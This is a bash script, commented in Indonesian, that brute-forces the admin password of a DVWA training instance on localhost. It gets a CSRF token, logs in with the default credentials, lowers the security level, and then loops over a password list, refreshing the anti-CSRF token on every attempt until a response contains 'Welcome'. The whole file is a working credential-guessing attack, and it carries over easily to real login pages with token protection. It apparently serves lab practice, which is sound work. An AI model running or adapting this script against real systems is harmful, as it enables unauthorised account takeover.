#!/bin/bash
TARGET="http://127.0.0.1:8000"
COOKIE_JAR=$(mktemp)
SECURITY_LEVEL="low"

echo "[*] Mengambil token CSRF awal..."
INIT_RESP=$(curl -s -c "$COOKIE_JAR" "$TARGET/login.php")
USER_TOKEN=$(echo "$INIT_RESP" | grep -oE "name='user_token' value='[a-f0-9]+'" | cut -d"'" -f4)

if [ -z "$USER_TOKEN" ]; then
  echo "[-] Gagal mengambil user_token! Apakah DVWA menyala?"
  rm -f "$COOKIE_JAR"
  exit 1
fi

echo "[*] Mencoba login ke DVWA dengan token..."
# Login awal (password default DVWA adalah admin)
curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "username=admin&password=admin&Login=Login&user_token=$USER_TOKEN" \
  "$TARGET/login.php" > /dev/null

# Set Security Level dengan menembak langsung ke halaman security.php
# Cara ini jauh lebih aman daripada mengedit file cookie jar manual
echo "[*] Mengatur tingkat keamanan ke: ${SECURITY_LEVEL^^}"
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "security=$SECURITY_LEVEL&seclev_submit=Submit" \
  "$TARGET/security.php" > /dev/null

# Verifikasi apakah session benar-benar didapatkan
PHPSESSID=$(grep -E "PHPSESSID" "$COOKIE_JAR" | awk '{print $NF}')
if [ -z "$PHPSESSID" ]; then
  echo "[-] Gagal login! Session tidak terbentuk."
  rm -f "$COOKIE_JAR"
  exit 1
else
  echo "[+] Login Berhasil! PHPSESSID: $PHPSESSID"
fi

echo "[+] Target: $TARGET/vulnerabilities/brute/"
echo "-----------------------------------------------"

# --- LOOP WORDLIST ---
while read -r PASS; do
  # 1. Buka halaman brute force dulu untuk mengambil user_token terupdate (proteksi anti-CSRF)
  BRUTE_PAGE=$(curl -s -b "$COOKIE_JAR" "$TARGET/vulnerabilities/brute/")
  TOKEN_BRUTE=$(echo "$BRUTE_PAGE" | grep -oE "name='user_token' value='[a-f0-9]+'" | cut -d"'" -f4)

  # 2. Kirim request Brute Force dengan password dan user_token yang sesuai
  # Jika DVWA Anda versi lama dan tidak pakai token di modul brute, variabel TOKEN_BRUTE akan kosong dan tidak merusak request
  RESP=$(curl -s -G \
    --data-urlencode "username=admin" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "user_token=$TOKEN_BRUTE" \
    --data-urlencode "Login=Login" \
    -b "$COOKIE_JAR" \
    "$TARGET/vulnerabilities/brute/")

  echo "[*] Trying: $PASS"

  # 3. Pengecekan berbasis string sukses/gagal yang lebih akurat
  # Jika respons mengandung kata "Welcome", artinya password BENAR
  if echo "$RESP" | grep -q "Welcome"; then
    echo ""
    echo "[+] ========================================"
    echo "[+] KETEMU! Password untuk admin adalah: $PASS"
    echo "[+] ========================================"
    break
  fi
done < passlist.txt

# --- CLEANUP ---
rm -f "$COOKIE_JAR"

